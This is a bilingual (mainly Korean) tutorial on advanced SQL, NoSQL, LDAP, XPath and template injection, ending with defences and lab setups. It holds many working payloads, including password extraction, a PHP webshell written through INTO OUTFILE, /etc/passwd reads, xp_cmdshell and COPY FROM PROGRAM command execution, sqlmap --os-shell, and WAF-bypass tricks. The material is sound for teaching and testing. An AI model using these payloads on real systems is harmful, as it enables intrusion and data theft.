# SQL Injection 심화 — Blind, Time-based, NoSQL

## 1. SQL Injection 유형 정리

| 유형 | 응답 방식 | 설명 |
|------|-----------|------|
| Error-based | 에러 메시지 | DB 오류를 통해 데이터 추출 |
| UNION-based | 결과 직접 출력 | UNION으로 다른 테이블 병합 |
| Blind Boolean | 참/거짓 응답 차이 | 조건에 따른 페이지 변화 |
| Blind Time-based | 응답 지연 | SLEEP/WAITFOR로 데이터 추출 |
| Out-of-band | DNS/HTTP 요청 | 외부 서버로 데이터 유출 |
| Stacked queries | 여러 쿼리 실행 | `;`로 추가 쿼리 삽입 |

---

## 2. Blind SQL Injection

### 2-1. Boolean-based Blind
응답이 참/거짓에 따라 달라지는 것을 이용

```sql
-- 기본 확인 (True → 정상 페이지, False → 다른 페이지)
' AND 1=1--       (True)
' AND 1=2--       (False)

-- DB 이름 길이 파악
' AND LENGTH(database())=5--    (5자면 True)
' AND LENGTH(database())>4--    (4보다 크면 True)

-- DB 이름 문자 추출 (이진 탐색)
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>96--   (소문자라면 True)
' AND ASCII(SUBSTRING(database(),1,1))=109--  (='m')

-- 테이블 이름 추출
' AND SUBSTRING(
    (SELECT table_name FROM information_schema.tables 
     WHERE table_schema=database() LIMIT 0,1),
    1,1)='u'--

-- 컬럼 이름 추출
' AND SUBSTRING(
    (SELECT column_name FROM information_schema.columns
     WHERE table_name='users' LIMIT 0,1),
    1,1)='i'--

-- 데이터 추출
' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='5'--
```

### 2-2. Time-based Blind
응답 지연을 통해 True/False 판단

```sql
-- MySQL
' AND SLEEP(5)--                          (무조건 5초 지연)
' AND IF(1=1,SLEEP(5),0)--               (True면 5초 지연)
' AND IF(LENGTH(database())=5,SLEEP(5),0)--

-- DB 이름 추출
' AND IF(ASCII(SUBSTRING(database(),1,1))=109,SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (LEN(DB_NAME())=6) WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=(CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM DUAL WHERE ROWNUM<0) END)--
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## 3. UNION 기반 고급 추출

### 3-1. 컬럼 수 확인

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- ORDER BY로 컬럼 수 파악
' ORDER BY 1--      (성공)
' ORDER BY 2--      (성공)
' ORDER BY 5--      (실패 → 컬럼 수 = 4)

-- UNION으로 확인
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   (성공 → 컬럼 3개)
```

### 3-2. 데이터 타입 확인

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- 문자열 출력 가능한 컬럼 찾기
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--
' UNION SELECT NULL,NULL,'a'--
```

### 3-3. MySQL 전체 DB 정보 추출

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- DB 버전 및 사용자
' UNION SELECT @@version,@@user(),database()--

-- 모든 DB 목록
' UNION SELECT schema_name,NULL,NULL FROM information_schema.schemata--

-- 특정 DB의 테이블
' UNION SELECT table_name,NULL,NULL 
  FROM information_schema.tables 
  WHERE table_schema='target_db'--

-- 테이블의 컬럼
' UNION SELECT column_name,data_type,NULL 
  FROM information_schema.columns 
  WHERE table_name='users'--

-- 여러 컬럼 한번에 (GROUP_CONCAT)
' UNION SELECT GROUP_CONCAT(username,':',password),NULL,NULL 
  FROM users--
```

### 3-4. 파일 읽기/쓰기 (MySQL)

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- 파일 읽기 (FILE 권한 필요)
' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
' UNION SELECT LOAD_FILE('/var/www/html/config.php'),NULL,NULL--

-- 웹쉘 쓰기 (쓰기 권한 + secure_file_priv 없어야 함)
' UNION SELECT '<?php system($_GET["cmd"]); ?>', NULL, NULL 
  INTO OUTFILE '/var/www/html/shell.php'--
```

---

## 4. DBMS별 차이점

### MySQL

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- 주석
-- comment
# comment
/*comment*/

-- 문자열 연결
CONCAT('a','b')
'a' 'b'      (공백)

-- 조건부
IF(조건,참,거짓)
SLEEP(5)

-- 시스템 테이블
information_schema.tables
information_schema.columns
```

### MSSQL (SQL Server)

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- 주석
-- comment
/*comment*/

-- 문자열 연결
'a'+'b'

-- 조건부
CASE WHEN 조건 THEN 참 ELSE 거짓 END

-- 지연
WAITFOR DELAY '0:0:5'

-- 시스템 테이블
sys.tables
sys.columns
INFORMATION_SCHEMA.TABLES

-- OS 명령 실행 (xp_cmdshell)
EXEC xp_cmdshell 'whoami'
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
```

### Oracle

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- 주석
-- comment
/*comment*/

-- 문자열 연결
'a'||'b'
CONCAT('a','b')

-- NULL 행 처리 (DUAL 테이블)
' UNION SELECT NULL FROM DUAL--

-- 시스템 테이블
all_tables
all_columns
user_tables

-- 사용자 정보
' UNION SELECT user,NULL FROM dual--
```

### PostgreSQL

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- 주석
-- comment
/*comment*/

-- 문자열 연결
'a'||'b'

-- 지연
pg_sleep(5)

-- 시스템 카탈로그
pg_catalog.pg_tables
information_schema.tables

-- OS 명령 (슈퍼유저)
COPY cmd_exec FROM PROGRAM 'id'
```

---

## 5. SQLMap 실전 활용

### 기본 사용법
```bash
# GET 파라미터
sqlmap -u "http://target.com/page?id=1"

# POST 파라미터
sqlmap -u "http://target.com/login" --data="user=admin&pass=1234"

# 쿠키 기반
sqlmap -u "http://target.com/page" --cookie="PHPSESSID=abc123; id=1"

# 헤더 인젝션
sqlmap -u "http://target.com/" -H "X-Forwarded-For: *"
sqlmap -u "http://target.com/" --user-agent="*"
```

### 정보 수집
```bash
# DB 목록
sqlmap -u "http://target.com/?id=1" --dbs

# 테이블 목록
sqlmap -u "http://target.com/?id=1" -D target_db --tables

# 컬럼 목록
sqlmap -u "http://target.com/?id=1" -D target_db -T users --columns

# 데이터 덤프
sqlmap -u "http://target.com/?id=1" -D target_db -T users --dump

# 전체 덤프
sqlmap -u "http://target.com/?id=1" --dump-all
```

### 고급 옵션
```bash
# WAF 우회 (tamper 스크립트)
sqlmap -u "http://target.com/?id=1" --tamper=space2comment
sqlmap -u "http://target.com/?id=1" --tamper=randomcase,charencode
sqlmap -u "http://target.com/?id=1" --tamper=between,randomcase,space2comment

# 레벨/리스크 조정
sqlmap -u "http://target.com/?id=1" --level=5 --risk=3

# 지연 (속도 조절)
sqlmap -u "http://target.com/?id=1" --delay=1

# OS 쉘 획득
sqlmap -u "http://target.com/?id=1" --os-shell

# 웹쉘 업로드
sqlmap -u "http://target.com/?id=1" --file-write=shell.php --file-dest=/var/www/html/shell.php

# Burp Suite 프록시 연동
sqlmap -u "http://target.com/?id=1" --proxy="http://127.0.0.1:8080"

# 요청 파일 사용 (Burp에서 저장)
sqlmap -r request.txt

# 쿠키 포함
sqlmap -r request.txt --cookie="auth=1"
```

### tamper 스크립트 목록
```
apostrophemask      ' → %EF%BC%87 (유니코드)
base64encode        Base64 인코딩
between             >를 NOT BETWEEN으로
charencode          URL 인코딩
chardoubleencode    이중 URL 인코딩
equaltolike         =를 LIKE로
greatest            >를 GREATEST()로
htmlencode          HTML 인코딩
randomcase          랜덤 대소문자
space2comment       공백을 /**/로
space2plus          공백을 +로
versionedkeywords   MySQL 버전 주석
```

---

## 6. WAF 우회 기법

### 인코딩 우회

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- URL 인코딩
' OR 1=1--   →   %27%20OR%201%3D1--

-- 이중 URL 인코딩
%27 → %2527

-- 유니코드 우회
' → %u0027
UNION → UN%00ION

-- HTML 엔티티
' → &#39;
```

### 키워드 우회

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- 주석 삽입
UN/**/ION SE/**/LECT
UNI%00ON
UNION%20SELECT
/*!UNION*/ /*!SELECT*/

-- 대소문자 혼합
UnIoN SeLeCt
uNiOn sElEcT

-- 공백 우회
UNION(SELECT)
UNION%09SELECT      (탭)
UNION%0aSELECT      (개행)
UNION%0dSELECT      (CR)

-- 키워드 중첩
UNUNIONION SESELECTLECT
```

### 논리 연산 우회

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- AND/OR 대체
' && 1=1--
' || 1=1--
' AND 1=1--    →    '&&1=1--
' OR 1=1--     →    '||1=1--
```

---

## 7. Second-Order SQL Injection

일단 DB에 저장했다가 나중에 다른 쿼리에서 사용될 때 실행

```
1단계: 회원가입 시 username = admin'--  저장
       → 무해하게 이스케이프되어 저장

2단계: 비밀번호 변경 쿼리:
       UPDATE users SET pw='new' WHERE username='admin'--'
       → admin'-- 가 username으로 사용되어
         UPDATE users SET pw='new' WHERE username='admin'
         --' (나머지는 주석)
       → admin 계정 비밀번호가 변경됨!
```

---

## 8. NoSQL Injection (MongoDB)

### MongoDB 기본 공격
```javascript
// 정상 쿼리
db.users.find({username: "admin", password: "pass"})

// NoSQL Injection (JSON 파라미터)
{
  "username": "admin",
  "password": {"$gt": ""}    ← $gt (greater than): 빈 문자열보다 크면 True → 모든 비밀번호 통과
}

// $where 연산자 악용
{"$where": "this.username == 'admin'"}
{"$where": "sleep(5000)"}   ← Time-based Blind
{"$where": "function(){return true}"}
```

### URL 파라미터 NoSQL Injection

SQL 인젝션은 사용자 입력 값이 SQL 쿼리에 직접 삽입될 때 쿼리 구조를 변조하여 데이터베이스를 공격하는 기법입니다. `sqlmap`은 이를 자동화하여 DB 종류 탐지부터 데이터 덤프까지 원클릭으로 수행합니다.

```
http://target.com/login?username=admin&password[$gt]=
http://target.com/login?username[$regex]=.*&password[$gt]=
```

### Blind NoSQL Injection

SQL 인젝션은 사용자 입력 값이 SQL 쿼리에 직접 삽입될 때 쿼리 구조를 변조하여 데이터베이스를 공격하는 기법입니다. `sqlmap`은 이를 자동화하여 DB 종류 탐지부터 데이터 덤프까지 원클릭으로 수행합니다.

```javascript
// 비밀번호 길이 확인
{"password": {"$regex": "^.{0,10}$"}}   (10자 이하면 True)

// 비밀번호 문자 추출
{"password": {"$regex": "^a"}}   (a로 시작하면 True)
{"password": {"$regex": "^ab"}}
{"password": {"$regex": "^abc"}}
```

---

## 9. SQL Injection 방어

### 준비된 쿼리 (Prepared Statement) — 가장 확실한 방어
```php
// PHP + PDO (취약한 코드)
$result = $db->query("SELECT * FROM users WHERE id='$id'");

// PHP + PDO (안전한 코드)
$stmt = $db->prepare("SELECT * FROM users WHERE id=?");
$stmt->execute([$id]);

// Python + MySQL
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))

// Java + JDBC
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE id = ?");
stmt.setString(1, userId);
```

### 입력 검증 및 화이트리스트
```python
#!/usr/bin/env python3
"""
requests 기반 SQL Injection 자동 탐지기
Boolean-based Blind, Error-based, Time-based 탐지 지원
사용법: python3 sqli_detector.py -u "http://target.com/page?id=1"
        python3 sqli_detector.py -u "http://target.com/login" --post "user=admin&pass=test"
"""
import argparse
import re
import time
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import requests
from requests import Response


# ── SQL 에러 패턴 (DB별) ───────────────────────────────────────────────────────
SQL_ERROR_PATTERNS: dict[str, list[str]] = {
    "MySQL":      [r"you have an error in your sql syntax",
                   r"warning: mysql_", r"mysql_num_rows\(\)"],
    "MSSQL":      [r"unclosed quotation mark", r"incorrect syntax near",
                   r"microsoft ole db provider for sql server"],
    "PostgreSQL": [r"pg_query\(\):", r"unterminated quoted string",
                   r"postgresql.*error"],
    "Oracle":     [r"ora-\d{5}:", r"oracle error", r"quoted string not properly terminated"],
    "SQLite":     [r"sqlite.*error", r"no such column:", r"unrecognized token:"],
}

# ── Boolean-based 확인용 페이로드 쌍 ──────────────────────────────────────────
BOOL_PAYLOADS: list[tuple[str, str]] = [
    ("' AND '1'='1", "' AND '1'='2"),        # 따옴표 기반
    (" AND 1=1--",   " AND 1=2--"),           # 정수 기반
    ("') AND ('1'='1", "') AND ('1'='2"),     # 괄호 포함
]

# ── Time-based 페이로드 (DB별) ────────────────────────────────────────────────
TIME_PAYLOADS: list[str] = [
    "'; SELECT SLEEP(5)--",                  # MySQL
    "'; WAITFOR DELAY '0:0:5'--",            # MSSQL
    "'; SELECT pg_sleep(5)--",               # PostgreSQL
    "' AND SLEEP(5)--",                      # MySQL (AND)
    "' AND 1=(SELECT 1 FROM PG_SLEEP(5))--", # PostgreSQL (AND)
]


@dataclass
class ScanResult:
    url: str
    param: str
    method: str
    vuln_type: str
    payload: str
    evidence: str = ""
    db_type: str = "Unknown"


def make_request(
    session: requests.Session,
    url: str,
    method: str,
    params: dict,
    timeout: float = 10,
) -> Optional[Response]:
    try:
        if method.upper() == "GET":
            resp = session.get(url, params=params, timeout=timeout)
        else:
            resp = session.post(url, data=params, timeout=timeout)
        return resp
    except requests.RequestException:
        return None


def detect_error_based(
    session: requests.Session,
    url: str,
    method: str,
    base_params: dict,
    param: str,
) -> Optional[ScanResult]:
    """SQL 에러 메시지 기반 탐지"""
    payloads = ["'", '"', "''", "1'", "1\""]
    for payload in payloads:
        params = {**base_params, param: base_params.get(param, "") + payload}
        resp = make_request(session, url, method, params)
        if resp is None:
            continue
        body = resp.text.lower()
        for db_type, patterns in SQL_ERROR_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, body, re.IGNORECASE):
                    return ScanResult(
                        url=url, param=param, method=method,
                        vuln_type="Error-based",
                        payload=payload,
                        evidence=re.search(pattern, body, re.IGNORECASE).group()[:80],
                        db_type=db_type,
                    )
    return None


def detect_boolean_based(
    session: requests.Session,
    url: str,
    method: str,
    base_params: dict,
    param: str,
) -> Optional[ScanResult]:
    """Boolean-based Blind 탐지"""
    original_val = str(base_params.get(param, "1"))

    for true_payload, false_payload in BOOL_PAYLOADS:
        params_true  = {**base_params, param: original_val + true_payload}
        params_false = {**base_params, param: original_val + false_payload}

        resp_true  = make_request(session, url, method, params_true)
        resp_false = make_request(session, url, method, params_false)

        if resp_true is None or resp_false is None:
            continue

        # 응답 길이 차이 10% 이상이면 Boolean 반응 있음
        len_true, len_false = len(resp_true.text), len(resp_false.text)
        if len_true > 0 and abs(len_true - len_false) / len_true > 0.10:
            return ScanResult(
                url=url, param=param, method=method,
                vuln_type="Boolean-based Blind",
                payload=true_payload,
                evidence=f"참({len_true}B) vs 거짓({len_false}B) 차이",
            )
    return None


def detect_time_based(
    session: requests.Session,
    url: str,
    method: str,
    base_params: dict,
    param: str,
    threshold: float = 4.5,
) -> Optional[ScanResult]:
    """Time-based Blind 탐지"""
    for payload in TIME_PAYLOADS:
        params = {**base_params, param: str(base_params.get(param, "1")) + payload}
        start = time.monotonic()
        resp = make_request(session, url, method, params, timeout=15)
        elapsed = time.monotonic() - start
        if elapsed >= threshold:
            db_hint = "MySQL" if "SLEEP" in payload else \
                      "MSSQL" if "WAITFOR" in payload else "PostgreSQL"
            return ScanResult(
                url=url, param=param, method=method,
                vuln_type="Time-based Blind",
                payload=payload,
                evidence=f"응답 {elapsed:.1f}초 지연",
                db_type=db_hint,
            )
    return None


def scan(
    url: str,
    post_data: Optional[str] = None,
    cookies: Optional[str] = None,
    headers: Optional[dict] = None,
    delay: float = 0.3,
) -> list[ScanResult]:
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (SQLi-Detector/2.0)"})
    if headers:
        session.headers.update(headers)
    if cookies:
        for item in cookies.split(";"):
            k, _, v = item.strip().partition("=")
            session.cookies.set(k.strip(), v.strip())

    method = "POST" if post_data else "GET"
    parsed = urlparse(url)

    if method == "GET":
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()}
    else:
        params = dict(pair.split("=", 1) for pair in post_data.split("&") if "=" in pair)

    if not params:
        print(f"[-] 파라미터 없음: {url}")
        return []

    results: list[ScanResult] = []
    for param in params:
        print(f"[*] 파라미터 스캔: {param}")
        for detect_fn in (detect_error_based, detect_boolean_based, detect_time_based):
            result = detect_fn(session, url, method, params, param)
            if result:
                results.append(result)
                print(f"  [!] {result.vuln_type} 발견! DB:{result.db_type}  "
                      f"payload:{result.payload!r}  근거:{result.evidence}")
                break  # 하나 발견하면 다음 파라미터로
        time.sleep(delay)

    return results


def main() -> None:
    parser = argparse.ArgumentParser(description="SQL Injection 자동 탐지기")
    parser.add_argument("-u", "--url", required=True, help="대상 URL")
    parser.add_argument("--post", help="POST 데이터 (예: user=admin&pass=1)")
    parser.add_argument("--cookie", help="쿠키 문자열 (예: session=abc)")
    parser.add_argument("--header", action="append", default=[],
                        help="추가 헤더 (예: X-Token:abc), 여러 번 사용 가능")
    parser.add_argument("--delay", type=float, default=0.3,
                        help="요청 간 딜레이(초) (기본: 0.3)")
    args = parser.parse_args()

    extra_headers = {}
    for h in args.header:
        k, _, v = h.partition(":")
        extra_headers[k.strip()] = v.strip()

    print(f"[*] SQL Injection 스캔 시작: {args.url}")
    results = scan(args.url, args.post, args.cookie, extra_headers, args.delay)

    if results:
        print(f"\n[+] 총 {len(results)}개 취약점 발견")
        for r in results:
            print(f"  - {r.param} ({r.vuln_type}, {r.db_type})")
    else:
        print("\n[-] 취약점 미발견 (수동 확인 권장)")


if __name__ == "__main__":
    main()
```

### 최소 권한 원칙

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- 웹 애플리케이션 전용 계정 생성
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'strong_pass';

-- 필요한 권한만 부여 (FILE, SUPER 등 위험 권한 제외)
GRANT SELECT, INSERT, UPDATE, DELETE ON mydb.* TO 'webapp'@'localhost';

-- 관리자 권한 절대 부여 금지
-- GRANT ALL PRIVILEGES ...  ← 위험!
```

---

## 10. LDAP Injection

### LDAP 기본 구조와 공격 원리
```
LDAP 필터 예시:
(&(uid=admin)(userPassword=secret))

공격 페이로드 — 인증 우회:
username: admin)(&
password: anything

결과 필터:
(&(uid=admin)(&)(userPassword=anything))
          → (&) 는 항상 True → 인증 우회!
```

### LDAP Injection 페이로드
```
# 인증 우회
username: *
username: admin)(*
username: *)(uid=*

# 모든 사용자 열거
username: *)(|(uid=*

# 속성 추출 (Blind)
username: admin)(|(password=a*
username: admin)(|(password=b*
→ 응답 차이로 비밀번호 첫 글자 추출
```

### LDAP Injection 방어

Java 코드입니다. Java는 기업 환경에서 널리 사용되며 역직렬화 취약점 등 Java 특유의 보안 이슈가 있습니다.

```java
// Java: LDAP 특수문자 이스케이프
import javax.naming.ldap.LdapName;

String safeDN = Filter.encodeValue(userInput);
// 특수문자: *, (, ), \, NUL → 이스케이프 처리

// Spring Security LDAP
String query = "(&(uid={0})(objectclass=person))";
// {0} 위치에 자동 이스케이프 적용
```

---

## 11. ORM Injection / Expression Language Injection

### ORM Injection (HQL, JPQL)
```java
// 취약한 Hibernate HQL
String hql = "FROM User WHERE username = '" + username + "'";
Query query = session.createQuery(hql);

// 공격:
// username = ' OR '1'='1
// username = admin' AND SLEEP(5)--

// 안전한 코드 — 파라미터 바인딩
Query query = session.createQuery("FROM User WHERE username = :username");
query.setParameter("username", username);
```

### Expression Language Injection (EL/OGNL)
```
EL Injection 테스트 페이로드:
${7*7}        → 49 출력되면 취약
#{7*7}        → JSF EL
*{7*7}        → Spring SpEL
${java.lang.Runtime.getRuntime().exec('calc')}

OGNL Injection (Struts2):
%{7*7}
%{''.class.forName('java.lang.Runtime').getMethod('exec',''.class).invoke(''.class.forName('java.lang.Runtime').getMethod('getRuntime').invoke(null),'calc')}

Server-Side Template Injection (SSTI) 유사 공격:
Jinja2:  {{7*7}}, {{config}}, {{''.__class__.__mro__[1].__subclasses__()}}
Twig:    {{7*7}}
FreeMarker: ${7*7}
Velocity: #set($x=7*7)${x}
```

### EL/SSTI 탐지 및 방어
```bash
# 탐지 페이로드 목록
${7*7}
{{7*7}}
<%= 7*7 %>
#{7*7}

# 방어: 사용자 입력을 템플릿 문자열에 직접 삽입 금지
# Jinja2 안전한 방법
template = Template("Hello {{ name }}")
template.render(name=user_input)  # 올바른 방법

# 위험한 방법
template = Template("Hello " + user_input)  # SSTI 가능!
```

---

## 12. SQL Injection 대량 노출 방지

### LIMIT 제어 우회 및 방어

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- 공격자: LIMIT 우회로 전체 데이터 추출
' UNION SELECT user, password FROM users LIMIT 1000--
' UNION SELECT user, password FROM users LIMIT 999999--

-- GROUP_CONCAT으로 한 번에 추출
' UNION SELECT GROUP_CONCAT(username,':',password SEPARATOR '\n'),NULL FROM users--
```

```python
#!/usr/bin/env python3
"""
SQLAlchemy + Flask 기반 안전한 페이지네이션 구현
Prepared Statement + 최대 행 수 제한 + Rate Limiting
"""
from flask import Flask, request, jsonify, abort
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
from sqlalchemy import text, create_engine
from sqlalchemy.orm import sessionmaker

app = Flask(__name__)
engine = create_engine("sqlite:///users.db")
Session = sessionmaker(bind=engine)

# Rate Limiter 설정 (IP 기반)
limiter = Limiter(
    key_func=get_remote_address,
    app=app,
    default_limits=["200 per hour", "20 per minute"],
    storage_uri="memory://",
)

MAX_PER_PAGE = 100   # 페이지당 최대 행 수 (대량 추출 방지)
ALLOWED_ORDER_COLS = {"id", "username", "created_at"}  # 화이트리스트


@app.route("/api/users")
@limiter.limit("30 per minute")  # 개별 엔드포인트 제한
def list_users():
    # 입력값 검증 (타입 강제 + 범위 제한)
    try:
        page     = max(1, int(request.args.get("page", 1)))
        per_page = min(MAX_PER_PAGE, max(1, int(request.args.get("per_page", 20))))
    except ValueError:
        abort(400, "page/per_page는 정수여야 합니다")

    order_by = request.args.get("order_by", "id")
    if order_by not in ALLOWED_ORDER_COLS:
        abort(400, f"order_by는 {ALLOWED_ORDER_COLS} 중 하나여야 합니다")

    offset = (page - 1) * per_page

    # Prepared Statement로 파라미터 바인딩 (SQL Injection 방어)
    # order_by는 화이트리스트로 이미 검증됐으므로 직접 포매팅 허용
    with Session() as session:
        rows = session.execute(
            text(f"SELECT id, username, email FROM users "
                 f"ORDER BY {order_by} "
                 f"LIMIT :limit OFFSET :offset"),
            {"limit": per_page, "offset": offset},
        ).fetchall()

    return jsonify({
        "page": page,
        "per_page": per_page,
        "data": [{"id": r.id, "username": r.username} for r in rows],
    })
```

---

## 13. XPath Injection

### XPath 기본 구조와 공격 원리
```
XPath는 XML 문서를 탐색하기 위한 언어
XML 기반 애플리케이션(SOAP 서비스 등)에서 XPath 인젝션 발생

취약한 XPath 쿼리 예시:
  /users/user[username/text()='admin' and password/text()='pass']

인증 우회 페이로드:
  username: admin' or '1'='1
  username: ' or 1=1 or '
  username: admin']/..  (경로 탐색)

결과 쿼리:
  /users/user[username/text()='admin' or '1'='1' and password/text()='...']
  → 항상 True → 인증 우회

Boolean 기반 Blind XPath:
  username: admin' and string-length(//user[1]/password)=6 and '1'='1
  → 비밀번호 길이 유추

문자 추출:
  username: admin' and substring(//user[1]/password,1,1)='a' and '1'='1
```

### XPath Injection 방어
```python
# Python lxml: 파라미터 바인딩
from lxml import etree

# 취약한 방식
xpath = f"//user[@name='{username}']"
tree.xpath(xpath)  # 위험!

# 안전한 방식 (lxml Extension Functions)
from lxml.etree import XPath
query = XPath("//user[@name=$name]")
result = query(tree, name=username)  # 파라미터 바인딩

# Java JAXP
// XPath 파라미터 바인딩은 표준이 없어 입력 이스케이프 필요
// 특수문자: ' " < > & → XML 엔티티로 이스케이프
```

---

## 14. PostgreSQL 특화 공격 기법

SQL 쿼리문입니다. SQL 인젝션 공격은 사용자 입력이 쿼리에 직접 포함될 때 발생하며 데이터베이스 전체를 침해할 수 있습니다.

```sql
-- PostgreSQL 슈퍼유저 확인
SELECT current_user, session_user, pg_is_in_recovery();

-- pg_read_file()으로 파일 읽기 (슈퍼유저 필요)
SELECT pg_read_file('/etc/passwd', 0, 1000);

-- COPY 명령으로 OS 명령 실행 (PostgreSQL 9.3+)
CREATE TABLE cmd_output (output text);
COPY cmd_output FROM PROGRAM 'id';
SELECT * FROM cmd_output;

-- lo_import / lo_export로 파일 업로드/다운로드
SELECT lo_import('/tmp/shell.php');
SELECT lo_export(OID, '/var/www/html/shell.php');

-- 확장 기능 (슈퍼유저)
CREATE EXTENSION IF NOT EXISTS dblink;
SELECT dblink_exec('host=localhost dbname=postgres', 'SELECT pg_sleep(5)');

-- PostgreSQL 버전 정보
SELECT version();
SELECT pg_version_num();
```

---

## 10. SQL Injection 실습 환경


SQL 인젝션은 사용자 입력 값이 SQL 쿼리에 직접 삽입될 때 쿼리 구조를 변조하여 데이터베이스를 공격하는 기법입니다. `sqlmap`은 이를 자동화하여 DB 종류 탐지부터 데이터 덤프까지 원클릭으로 수행합니다.

```bash
# DVWA (Damn Vulnerable Web Application)
docker run -d -p 80:80 vulnerables/web-dvwa

# SQLi-labs
docker run -d -p 8080:80 acgpiano/sqli-labs

# WebGoat
docker run -d -p 8080:8080 webgoat/webgoat

# Juice Shop
docker run -d -p 3000:3000 bkimminich/juice-shop
```

### 실습 시나리오
```
1. DVWA → SQL Injection 섹션
   - Security: Low → SQL Injection 수동 공격
   - Security: Medium → GET → POST 우회
   - Security: High → 세션 기반 우회

2. SQLi-labs
   - Less-1 ~ 5: 기본 오류 기반
   - Less-6 ~ 10: 이중 따옴표
   - Less-11 ~ 20: POST 기반
   - Less-21 ~ 37: Cookie/헤더 기반

3. HackTheBox / TryHackMe SQL Injection 챌린지
```

---

<a name="english"></a>

# SQL Injection Advanced — Blind, Time-based, NoSQL

## 1. SQL Injection Type Overview

| Type | Response Method | Description |
|------|-----------------|-------------|
| Error-based | Error message | Extract data through DB errors |
| UNION-based | Direct output | Merge other tables using UNION |
| Blind Boolean | True/False response difference | Page changes based on condition |
| Blind Time-based | Response delay | Extract data using SLEEP/WAITFOR |
| Out-of-band | DNS/HTTP request | Exfiltrate data to external server |
| Stacked queries | Multiple queries | Insert additional queries with `;` |

---

## 2. Blind SQL Injection

### 2-1. Boolean-based Blind
Exploits differences in responses based on true/false conditions

```sql
-- Basic check (True → normal page, False → different page)
' AND 1=1--       (True)
' AND 1=2--       (False)

-- Find DB name length
' AND LENGTH(database())=5--    (True if 5 chars)
' AND LENGTH(database())>4--    (True if greater than 4)

-- Extract DB name character (binary search)
' AND SUBSTRING(database(),1,1)='a'--
' AND ASCII(SUBSTRING(database(),1,1))>96--   (True if lowercase)
' AND ASCII(SUBSTRING(database(),1,1))=109--  (='m')

-- Extract table name
' AND SUBSTRING(
    (SELECT table_name FROM information_schema.tables 
     WHERE table_schema=database() LIMIT 0,1),
    1,1)='u'--

-- Extract column name
' AND SUBSTRING(
    (SELECT column_name FROM information_schema.columns
     WHERE table_name='users' LIMIT 0,1),
    1,1)='i'--

-- Extract data
' AND SUBSTRING((SELECT password FROM users LIMIT 0,1),1,1)='5'--
```

### 2-2. Time-based Blind
Determine True/False through response delay

```sql
-- MySQL
' AND SLEEP(5)--                          (always 5 sec delay)
' AND IF(1=1,SLEEP(5),0)--               (5 sec delay if True)
' AND IF(LENGTH(database())=5,SLEEP(5),0)--

-- Extract DB name
' AND IF(ASCII(SUBSTRING(database(),1,1))=109,SLEEP(5),0)--

-- MSSQL
'; WAITFOR DELAY '0:0:5'--
'; IF (LEN(DB_NAME())=6) WAITFOR DELAY '0:0:5'--

-- Oracle
' AND 1=(CASE WHEN (1=1) THEN 1 ELSE (SELECT 1 FROM DUAL WHERE ROWNUM<0) END)--
' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--

-- PostgreSQL
'; SELECT pg_sleep(5)--
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

---

## 3. Advanced UNION-based Extraction

### 3-1. Determine Column Count

```sql
-- Find column count using ORDER BY
' ORDER BY 1--      (success)
